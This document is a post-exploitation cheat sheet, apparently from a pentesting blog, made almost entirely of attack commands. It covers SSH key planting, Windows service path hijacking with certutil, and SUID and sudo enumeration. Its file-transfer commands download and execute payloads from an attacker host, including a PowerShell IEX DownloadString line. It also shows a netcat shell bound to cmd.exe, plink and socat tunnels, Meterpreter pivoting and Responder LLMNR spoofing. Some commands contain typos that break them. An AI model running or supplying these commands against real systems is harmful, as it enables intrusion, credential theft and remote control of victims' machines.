---
title: Post exploitation
excerpt: "This is a guide for post exploitation"
last_modified_at: 13-01-2022
categories:
- guide
tags:  
- pentest
- post-exploitation
- exploitation
image: /assets/images/cheatsheet/post-exploitation.jpeg
---


# Privilege escalation

### SSH
```bash
ssh-keygen -f user # Attack

# Victim
mkdir  (home/)~www-data/
mkdir ~/.ssh/
touch ~/.ssh/authorized_keys
echo "public_key" > ~/.ssh/authorized_keys
ssh www-data@172.0.0.1 -p 2222 -i user
```  

## Windows
### Automatized
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat)  



### Mandatory level
- whoami /groups  

### Services
```powershell
wmic service # List services
wmic service get Name,Sate,PathName | findstr "Running" # Running services
sc query servicename # Informations about a service 
sc qc servicename # Service configurations
sc config servicename binPath="certutil -urlcache -f priv.exe" # Change the path of the file
sc start servicename
```  

## Linux
### Automatized
- [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)  
- [gtfobins](https://gtfobins.github.io/)  
- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)  

### SUID/GETUID
```bash
find / -user root -perm -4000 -print 2>/dev/null 
```  

### Permissions
```bash 
sudo -l # Programs that run as sudo

find / -type f -perm 777 2>/dev/null # Files with permissions

ls /etc/cron.* # Check all crontab folders

uname -l # Kernel and SO versions
cat /etc/issue
```  


## Transfer files
```bash
python -m SimpleHTTPServer 80 #Open server
python3 -m http.server 80

# Windows
certutil.exe -urlcache -f [http://172.20.1.6/file.exe](http://172.20.1.6/file.exe) file.exe
powershell.exe wget [http://172.20.1.6/file.exe](http://172.20.1.6/file.exe) -OutFile file.exe
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://172.20.1.6/file.exe','file.exe')
powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://172.20.1.6/poc.txt') # Read and execute 
# Windows hex
/usr/share/windows-resources/binaries/upx -9 exec.exe # Compress
exe2hex -x exec.exe -p exec.txt # To hex
nc -l 10.10.10.10 4444 < exec.txt

# Linux
wget http://172.20.1.6/file.exe -O /tm/file.exe
curl http://172.20.1.6/file.exe -o file.exe

scp /source/folder/scp.zip root@191.162.0.2:/destiny/folder #ssh
```  


## Tunneling
```bash
# Windows 
nc.exe -vnlp 5555 -s 127.0.0.1 -e cmd.exe # Attacker
plink.exe -ssh -l user -pw root -R 192.168.0.8:1337:127.0.0.1:5555 192.168.0.8 # Victim
nc -v 127.0.0.1 1337 # Attacker

# Linux
socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr
socat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22

ssh www-data@172.0.0.1 -p 2222 -i us -L 3333:127.0.0.1:3306
```


## Pivoting
Meterpreter
```bash
ipconfig # Networks interface
route # Identify network

run autoroute -s 10.0.20.0/24 #Add a route to our machine
use auxiliary/server/sock4a # Create a proxy in port 1080
nano /ect/proxychains.conf # Add this proxy to proxychains
proxychains nmap -v â€”open -sT -p 110,139 -Pn 10.10.20.0/24 # The network is visible
V
portfwd add -l 110 -p 110 -r 10.20.20.4 # Portfoward  a specific port
nmap -sV -p 110 127.0.0.10 # Can acess this port
```

## Internal pentest
### Responder
A LLMNR & NBT-NS Spoofing Attack.  
```bash
vim /etc/responder/Responder.conf # Configure the ips field RespondTo

responder -I eth0 -Prv # Will list to all
```